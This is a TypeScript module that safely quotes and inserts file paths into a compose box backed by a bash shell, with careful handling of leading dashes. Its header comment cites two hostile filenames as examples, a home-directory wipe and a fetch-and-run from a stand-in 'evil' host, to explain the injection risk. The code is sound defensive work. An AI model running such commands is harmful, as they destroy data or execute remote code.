/** Turn a file path into text that is safe to drop into the compose box (#792).
 *
 *  The compose box does not only talk to an agent — the `shell` engine is a plain `bash -l`, so
 *  whatever this produces can end up on a command line the user presses Enter on. A repository
 *  can contain a file literally named `; rm -rf ~` or `$(curl evil|sh)`, and a path is attacker
 *  controlled in exactly the way a filename is. So this is a security boundary, not formatting.
 *
 *  Two rules, and the second one is the one that is easy to get wrong.
 */

/** Characters that never need quoting in a POSIX shell word. Deliberately the conservative
 *  `shlex.quote` set: quote unless the token is plainly inert, rather than trying to enumerate
 *  what is dangerous. Anything outside this set — whitespace, quotes, `;`, `&`, `|`, `$`,
 *  backticks, globs, newlines, parentheses — forces quoting. */
const INERT = /^[A-Za-z0-9_@%+=:,./-]+$/;

/** Quoting does NOT make a leading dash safe. Single quotes stop *expansion*; they do nothing
 *  about *option parsing*, which happens after the shell has split the word. Measured on
 *  coreutils 9.4:
 *
 *      $ stat '-l'    → stat: invalid option -- 'l'
 *      $ stat './-l'  → File: ./-l
 *
 *  So a relative token that begins with `-` is re-anchored as `./-…` BEFORE any quoting decision.
 *  An absolute path cannot reach this — it begins with `/`.
 */
function deoptionise(rel: string): string {
  return rel.startsWith("-") ? `./${rel}` : rel;
}

function quote(token: string): string {
  if (INERT.test(token)) return token;
  // Close the quote, emit an escaped quote, reopen — the only way to get a `'` inside a
  // single-quoted shell word.
  return `'${token.split("'").join(`'\\''`)}'`;
}

/** Make `path` relative to `cwd` when it is inside it, else leave it absolute.
 *
 *  Only a true path-segment prefix counts: `/home/u/proj2` is NOT inside `/home/u/proj`, and a
 *  plain `startsWith` would have made it relative as `2`, silently naming a different file. */
export function relativise(path: string, cwd: string): string {
  const base = cwd.endsWith("/") ? cwd.slice(0, -1) : cwd;
  if (!base || path === base) return path;
  return path.startsWith(`${base}/`) ? path.slice(base.length + 1) : path;
}

/** The text to insert into the compose draft for `path`, given the session's `cwd`. */
export function pathToken(path: string, cwd: string): string {
  const rel = relativise(path, cwd);
  // Order matters: re-anchor first, then quote. Quoting first would produce `'-l'`, which is
  // still parsed as an option.
  return quote(deoptionise(rel));
}

/** Splice `token` into `draft` over [start, end), keeping exactly one space at each boundary that
 *  needs one — so a path dropped into `look at |and tell me` reads as a sentence rather than
 *  gaining a double space or none at all. Returns the new draft and where the caret belongs.
 *
 *  Separate from `joinSpoken` on purpose: that one is append-only (it exists to continue a
 *  dictated draft), and appending is not what "insert at the cursor" means. */
export function spliceToken(
  draft: string,
  start: number,
  end: number,
  token: string,
): { text: string; caret: number } {
  const before = draft.slice(0, start);
  const after = draft.slice(end);
  const lead = before && !/\s$/.test(before) ? " " : "";
  const trail = after && !/^\s/.test(after) ? " " : "";
  const insert = `${lead}${token}${trail}`;
  return {
    text: `${before}${insert}${after}`,
    // After the token itself, not after the trailing space: the user keeps typing the sentence.
    caret: before.length + lead.length + token.length,
  };
}
